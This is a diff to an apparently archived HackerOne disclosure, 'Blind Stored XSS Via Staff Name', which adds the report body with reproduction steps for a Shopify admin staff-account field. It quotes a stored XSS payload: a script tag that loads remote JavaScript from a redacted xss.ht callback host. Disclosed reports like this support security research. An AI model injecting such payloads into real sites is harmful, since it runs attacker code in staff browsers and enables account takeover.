@@ -8,6 +8,7 @@ tags:
 substate: "resolved"
 weakness: "Cross-site Scripting (XSS) - Stored"
 enriched: true
+body: true
 date: 2020-08-18
 submitted: 2020-07-31T23:06:18.152Z
 bounty_usd: 3000
@@ -25,6 +26,24 @@ title: "Blind Stored XSS Via Staff Name"
 - Report: [https://hackerone.com/reports/948929](https://hackerone.com/reports/948929)
 - CWE: Cross-site Scripting (XSS) - Stored
 - Submitted: 2020-07-31T23:06:18.152Z
+
+## Report body
+
+Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).
+
+Hey Team, I found blind stored XSS when i add staff name  in https://your-store.myshopify.com/admin/settings/account
+
+Step to reproduce : 
+1. Go to https://your-store.myshopify.com/admin/settings/account
+2. Add Staff Account 
+3. Fill First & Last Name with this payload "><script>$.getScript("//█████████.xss.ht")</script>
+4. XSS will be fired in your internal web
+
+You should check the DOM.html guys
+
+## Impact
+
+Stored XSS
 
 ## Timeline
 
